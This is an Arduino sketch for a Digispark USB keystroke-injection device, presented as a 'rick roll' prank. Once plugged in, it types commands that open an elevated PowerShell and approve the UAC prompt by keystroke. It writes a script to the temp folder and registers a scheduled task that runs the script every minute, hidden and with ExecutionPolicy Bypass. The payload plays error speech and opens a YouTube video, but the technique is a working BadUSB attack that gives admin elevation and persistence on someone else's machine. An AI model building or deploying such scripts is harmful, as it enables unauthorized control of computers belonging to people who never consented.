// rick roll task by Shiro

#include "DigiKeyboard.h"
void setup() {}
  

void loop() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("Powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  DigiKeyboard.delay(5000);
  // you can delelte error sound by deleting from "add-type" to "music.')n"
  DigiKeyboard.println(F("$put = \"Add-Type -AssemblyName System.speech\n$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer\n$speak.Speak('error, error, error, error, error, error, error, error. playing a music.')\nstart https://www.youtube.com/watch?v=oHg5SJYRHA0\nexit\""));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("write-output $put > $env:temp\\roll.ps1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  // /SC — defines the schedule for the task. Options available, include MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT.
  // defines the time to run the task (in 24 hours format).
  DigiKeyboard.print("schtasks /create /tn \"RickRoll\" /SC MINUTE /st 13:00 /tr \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command '& $env:temp\\roll.ps1\"");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
 for(;;)
  {
  }
}
